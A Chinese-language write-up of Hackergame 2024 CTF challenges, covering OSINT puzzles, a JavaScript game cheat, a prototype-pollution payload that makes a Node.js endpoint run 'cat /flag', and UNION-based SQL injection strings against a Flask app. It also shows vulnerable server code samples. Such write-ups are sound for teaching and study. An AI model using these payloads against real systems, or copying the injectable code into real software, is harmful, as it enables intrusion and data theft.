> You can also find this writeup at my [blog](http://blog.weskwong.tech/index.php/archives/Hackergame-2024-Writeup.html).

# 签到

参考[往年的题解](https://github.com/USTC-Hackergame/hackergame2023-writeups/blob/master/official/Hackergame%20%E5%90%AF%E5%8A%A8/README.md)，可以猜测是一道「修改URL参数」的Web题

进入题目界面后直接点击提交，可以观察到URL中出现了一个参数`pass=false`，我们将其改为`pass=true`即可

> 这个[BGM](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/Hackergame.mp3)是真洗脑啊（

# 喜欢做签到的 CTFer 你们好呀

题目提到「两个 flag 就藏在中国科学技术大学校内 CTF 战队的招新主页里」，因此我们首先需要找到这个主页

直接搜索「中国科学技术大学 CTF 招新」可以找到[github招新仓库](https://github.com/Nebula-CTFTeam/Recruitment-2024)，直接在仓库中搜索「flag」，发现一无所获，因此开始翻找仓库里面的内容，最后在[profile](https://github.com/Nebula-CTFTeam/.github/tree/main/profile)目录中找到了战队的介绍

> # Nebula-CTFTeam
>
> We are [Nebula](https://nebuu.la/).

点击[Nebula](https://nebuu.la/)这个链接发现进入一个模拟终端的网页中，我们二话不说，直接一个`ls -a`，发现了一个叫`.flag`的文件，直接~~猫~~`cat`一下文件内容，可以得到第一个flag

目录下还有其他文件夹，我们`cd`发现`Permission denied`，遇到这种情况，我们第一时间就是一个`sudo`，但是竟然自动跳转到了[奶龙](https://www.bilibili.com/bangumi/play/ss40551)播放界面！~~一气之下输入`rm -rf /*`试图扬了这个主页~~

> 真是不得不佩服出题组的整活能力，玩梗相当密集

我们发现这个终端似乎相当不完善，输入`rm`命令也会提示`command not found`，因此我们输入`help`命令查看一下这个终端所支持的指令：


```shell
Welcome! Here are all the available commands:

=========== Available Commands ===============

about awards banner bing cat cd echo email env github help ls members nvim readme repo sudo sumfetch vi whoami

==============================================

Helpful Tips:
	[tab]: trigger completion.
	[ctrl+l]/clear: clear terminal.
	Type 'sumfetch' to display summary.

Credit: Based on [Cveinnt](https://github.com/Cveinnt)'s awesome [LiveTerm](https://github.com/Cveinnt/LiveTerm).
```

遍历列出的指令，发现在输入`env`命令时，会显示：

```shell
PWD=/root/Nebula-Homepage ARCH=loong-arch NAME=Nebula-Dedicated-High-Performance-Workstation OS=NixOS❄️ FLAG=flag{actually_theres_another_flag_here_trY_to_f1nD_1t_y0urself___join_us_ustc_nebula} REQUIREMENTS=1. you must come from USTC; 2. you must be interested in security!
```

参数`FLAG`的内容即为第二个flag。

# 猫咪问答（十周年纪念版）

## T1

> 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？

搜索「中国科学技术大学信息安全大赛2015」可以找到一个[罗列了往届存档资料的网页](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/)，根据2024年为第十一届，可以知道2015年应为第二届，进入[第二届存档网页](https://lug.ustc.edu.cn/wiki/sec/contest.html)，可以看到这样一个介绍：

> 10 月 17 日 周六晚上 19:30 **3A204** 网络攻防技巧讲座 10 月 18 日 周日上午 10:00 初赛 在线开展 10 月 24 日 周六凌晨 00:00 初赛结束 后续开展复赛

可知答案应为「3A204」

## T2

> 众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？

在T1中我们已经找到了[存档网页](https://lug.ustc.edu.cn/wiki/lug/events/hackergame/)，翻找关于近五年（不含今年）的比赛记录，通过「官方writeup」可以知道「题目数」：

|  年份  | 题目数 |
| :--: | :-: |
| 2023 | 29  |
| 2022 | 33  |
| 2021 | 31  |
| 2020 | 31  |
| 2019 | 29  |

因此符合条件的是2023年和2019年的Hackergame，但[2023年的新闻](https://lug.ustc.edu.cn/news/2023/12/hackergame-2023/)中仅提到了参赛人数「超过4100」人，而[2019年的新闻](https://lug.ustc.edu.cn/news/2019/12/hackergame-2019/)中精确地提到了总共有「2682」人注册

尝试发现答案就是「2682」

## T3

> Hackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？

这里其实有一点经验成分，往届的Hackergame在比赛结束后都会在writeup仓库中放出「花絮」，因此直接找到[2018年writeup仓库](https://github.com/ustclug/hackergame2018-writeups)，找到[花絮](https://github.com/ustclug/hackergame2018-writeups/blob/master/misc/others.md)

可以知道答案为「程序员的自我修养」

# T4

> 在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？

搜索关键词「USENIX Security 2024 中国科学技术大学 电子邮件伪造攻击」可以找到[关于该论文的新闻](https://if.ustc.edu.cn/news/2024_08_20.php)，在新闻内容中可以找到如下的新闻内容：

> 美国东部时间2024年8月14日，黄轩博同学在会场Track: Network Security II: Attack汇报了论文FakeBehalf: Imperceptible Email Spoofing Attacks against the Delegation Mechansim in Email Systems。该论文对当前邮件系统的安全性进行了系统性分析，侧重于邮件的代理机制协议与相关实现，构造了若干新型的、具有高度欺骗性的攻击邮件，且在大量主流邮件服务提供商（16种）与20个不同的邮件客户端进行了测试，验证了攻击的普适性和危害。多位国际同行对该文章兴趣盎然，在会场中、汇报结束后，来自伊利诺伊大学的Nicholas Wang与黄轩博同学热烈讨论了这类攻击的可能防御策略，以及如何做到高安全的同时兼容现有系统。

尝试答案$16 \times 20 = 320$，发现答案不正确，因此我们需要查看[论文](https://www.usenix.org/system/files/usenixsecurity24-ma-jinrui.pdf)来得到实验设置

读论文并回答问题，正是AI擅长的领域，于是我们直接「通义千问，启动！」

![QQ_1730872077984.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730872077984.png)

可以看到，320不正确的原因是，对于16个提供商，作者还直接在他们提供的网页端进行了测试，没有用到20个客户端，因此实际上可以看作是21个客户端（有一个是服务商自己的网页端），答案为「336」

## T5

> 10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？

喜欢科技新闻的小朋友们~~，你们好呀~~大概率会了解到「Linux内核对俄罗斯维护者进行了除名」这个新闻，不了解到也没事，我们直接搜索「10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除」就能找到相关新闻。

我们直接查看[MAINTAINERS文件的提交历史](https://github.com/torvalds/linux/commits/master/MAINTAINERS)，寻找10月份的提交记录，很容易能找到一个「热度很高」的commit：

![QQ_1730873615210.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730873615210.png)

查看commit内容可知该commit即为题目提到的commit，因此答案为「6e90b6」

## T6

> 大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？

看到很多群友直接去申请tokenizer的使用权，但是实际上，大模型的API是按照token数付费的，为了估算成本，现在已经有很多网站提供了计算token的免费工具，我们只需要搜索「token计数器」，很容易能找到[可用的网站](https://tokencounter.org/)，我们将选项调为「Llama3」，然后清除猫咪问答页面的缓存，得到新页面的源代码，将其输入到网站中即可得到答案：

![image.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/20241106143939.png)

可以看到，答案为「1833」

# 打不开的盒

> 这道题让我想起了Hackergame2022的[线路板](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/official/%E7%BA%BF%E8%B7%AF%E6%9D%BF/README.md)题目，也是给一个工程文件，经过编辑后即可看到隐藏的flag

下载题目附件发现是一个`stl`格式的3D文件，那似乎比线路板题目更简单了，直接使用支持查看`stl`格式文件的软件或[在线网站](https://3dviewer.net/)即可（Mac直接就能打开，在线网站也很多），然后将视角调整到盒内，即可看到flag

![image.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/20241106145149.png)

# 每日论文太多了！

 刚开始做这道题时，习惯性地使用zotero下载了论文，结果zotero自动下载的竟然是预印版的论文，导致这道题卡了好久

后面看到群聊有人说怀疑自己的zotero有问题，我突然才意识到，会不会zotero下载的论文不是页面直接下载的论文，然后直接在[网页](https://dl.acm.org/doi/10.1145/3650212.3652145)直接点击下载pdf，发现论文真的不一样！~~zotero害人不浅啊~~

下载正确的论文后，发现题目马上变得简单了起来，直接在论文里搜索「flag」，发现光标指向了一个空白的地方

![QQ_1730961102242.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730961102242.png)

此处周围的一个灰色的框显得十分突兀，我们打开「pdf编辑模式」，尝试将这个框框去掉

进入编辑模式后，点击刚刚光标指向的文本框，发现原来是文本图层被放在了图片下方，导致我们不能直接看到这段文字，接着将灰白色框框删除，我们找到了flag！

![QQ_1730961268234.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730961268234.png)

# 比大小王

遇到Web题，首先就是一个F12启动！

发现页面的JS代码并没有做任何混淆处理，而且函数和变量的命名十分清晰，分析一下代码逻辑后，发现游戏在加载游戏的时候将所有的题目题面通过`data.values`变量传入保存为`state.values`，在游戏过程中将输入结果保存到`state.inputs`，当分数到达100分时，调用`submit`函数将输入的结果POST到服务端，服务器根据答案序列是否正确来返回结果

由于游戏开始我们就得到了所有的题面，因此我们可以进行一个作弊，在游戏开始之前就把结果算好，然后直接`submit`

```javascript
function getCorrectInputs() {
  for (var i = 0; i < state.values.length; i++) {
    if (state.values[i][0] < state.values[i][1]) {
      state.inputs.push('<');
    }
    else {
      state.inputs.push('>');
    }
  }
  submit(state.inputs);
}
```

在`state.values`变量赋值语句之后调用这个函数

```javascript
state.values = data.values;
getCorrectInputs();
```

然而「心急吃不了热豆腐」，在比赛开始之前直接提交答案会被「制裁」

![QQ_1730965375775.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730965375775.png)

因此我们将调用`submit`函数的逻辑移动至比赛开始之后，观察代码，我们可以发现函数`updateCountdown`即为比赛开始倒计时的函数，在包含`state.allowInput = true;`的代码块中调用`submit`即可取得flag！

```javascript
} else if (seconds <= 0) {
	document.getElementById('dialog').style.display = 'none';
	state.allowInput = true;
	submit(state.inputs); // 在这里调用submit
	updateTimer();
}
```

# 旅行照片 4.0

> 又到了最喜欢的社会工程学题目（喜）

## LEO_CHAN!

> 问题 1: 照片拍摄的位置距离中科大的哪个校门更近？（格式：`X校区Y门`，均为一个汉字）

我们直接搜索图片中最显眼的「科里科气科创驿站」，直接就能得到照片所在位置，再通过街景可以确定确实是照片拍摄点

![QQ_1730966612674.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730966612674.png)

找到了位置，接下来判断最近的校门便是很轻松的事情，我们可以得到答案为「东校区西门」

> 问题 2: 话说 Leo 酱上次出现在桁架上是……科大今年的 ACG 音乐会？活动日期我没记错的话是？（格式：`YYYYMMDD`）

直接搜索「中科大 ACG 音乐会」，可以找到投稿在B站的[音乐会单品](https://www.bilibili.com/video/BV1RZ421p77C/)，可以猜测投稿的up主是举办方「中科大LEO动漫协会」的[B站官号](https://space.bilibili.com/7021308)，对该账号进行~~家访~~动态检索，可以找到[关于音乐会活动的桁架照片](https://www.bilibili.com/opus/930934582351495204)（还能抓到选手群管理员「TianKaiM」在Hackergame开赛当天的评论）

![QQ_1730967410901.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730967410901.png)

可以得到答案为「20240519」

## FULL_RECALL

> 问题 3: 这个公园的名称是什么？（不需要填写公园所在市区等信息）

突破点在于照片右下角的垃圾桶，写着几个小字「六安园林」，除此之外，还有比较明显的特征，道路中央标线是彩色的，我们搜索「六安 公园 彩色道路」，可以找到这样一篇[新闻报道](https://www.sohu.com/a/498987928_121123834)，文中有这样一段描述：「园内的一条沥青路跑道的中央标线由红、黄、蓝三色线条交织而成」，十分符合照片的特征

根据该新闻，我们可以知道名字为「中央公园」

> 问题 4: 这个景观所在的景点的名字是？（三个汉字）

具有非常明显的景观特点，直接搜图可以得到

![QQ_1730968016677.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730968016677.png)

因此答案为「坛子岭」

## OMINOUS_BELL

> 问题 5: 距离拍摄地最近的医院是？（无需包含院区、地名信息，格式：XXX医院）
> 问题 6: 左下角的**动车组型号**是？

根据题目提示「四编组动车」和照片的特征，我们搜索「粉红色四编组动车」，很容易能找到[介绍这趟列车的推文](https://app.xinhuanet.com/news/article.html?articleId=97deae9f-12b3-4668-bb33-8646a9c99b9c)，根据推文介绍，这是「穿梭在北京怀柔与密云之间的“怀密号”，使用的是CRH6F-A型电力动车组」

因此我们可以得到问题6的答案「CRH6F-A」

继续阅读推文，可以发现推文提供了一份该列车的运行路线图

![image.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/20241107173020.png)

然后观察题目照片，可以观察到「大量并行的铁轨」以及「通向疑似是列车库房的铁轨」，搜索这种特征我们可以发现一般出现在名为「动车运用所」这样的地点，根据路线图，我们在地图搜索「北京北动车所」，我们可以发现该地卫星图与照片十分契合

![QQ_1730972066314.png](https://weskwong-img-bed.obs.cn-east-3.myhuaweicloud.com/img/QQ_1730972066314.png)

在右下角我们可以得知问题5的答案为「积水潭医院」

# Node.js is Web Scale

观察题目源代码：

```javascript
// GET /execute - Run commands which are constant and obviously safe.
app.get("/execute", (req, res) => {
  const key = req.query.cmd;
  const cmd = cmds[key];
  res.setHeader("content-type", "text/plain");
  res.send(execSync(cmd).toString());
});
```

我们可以发现，我们可以对目录`/execute`传入一个`cmd`参数来使网页执行命令，然而在代码中执行命令的逻辑是从`cmds`这个对象中获取已经定义好的命令来执行，那么我们有没有办法让`cmds`读取到我们想要的命令呢？

检索Node.js的相关漏洞，我们可以找到一种叫做「原型链污染」的方法

大概可以理解为js代码中所有的对象都继承自一个「原型对象」，而本题代码中的`store`和`cmds`这样的全局对象可以看作继承自同一个「原型链顶端的null对象」，而在访问对象的属性时，如果该属性不存在，则会逐级向上寻找原型对象是否存在该属性，直到顶端的null对象

因此思路便十分显然了，通过修改`store`的原型对象的属性，从而使`cmds`在找不到自身属性时向上寻找到我们定义好的属性然后执行

首先通过`set`注入我们想要的命令

Key:

```
__proto__.whynotgivemetheflag
```

Value:

```
cat /flag
```

然后访问`execute`目录并传入参数即可得到flag

```
/execute?cmd=whynotgivemetheflag
```

# PaoluGPT

观察网页后端源代码：

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(f"select title, contents from messages where id = '{conversation_id}'")
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

网站将URL参数`conversation_id`直接传入sql查询语句中，因此存在一个很明显的注入点，我们使用「联合查询注入」，直接查询`contents`字段中存在`flag`的数据

```
view?conversation_id=' union select title, contents from messages where contents like '%flag%'--
```

发现返回了一个大量空白的网页，我们直接在网页中搜索`flag`，即可得到一个flag

继续观察源代码：

```python
@app.route("/list")
def list():
    results = execute_query("select id, title from messages where shown = true", fetch_all=True)
    messages = [Message(m[0], m[1], None) for m in results]
    return render_template("list.html", messages=messages)
```

我们可以发现查询语句中存在一个`shown = true`的条件，因此如果直接使用爆破的方式遍历聊天记录列表，只能得到符合这个条件的flag

> 我做到这里才发现我好像直接把两道题都做完了

我们给前面的注入语句加入`shown = true`和`shown = false`的条件

```
view?conversation_id=' union select title, contents from messages where shown = true and contents like '%flag%'--
```

```
view?conversation_id=' union select title, contents from messages where shown = false and contents like '%flag%'--
```

即可分别得到两道题的flag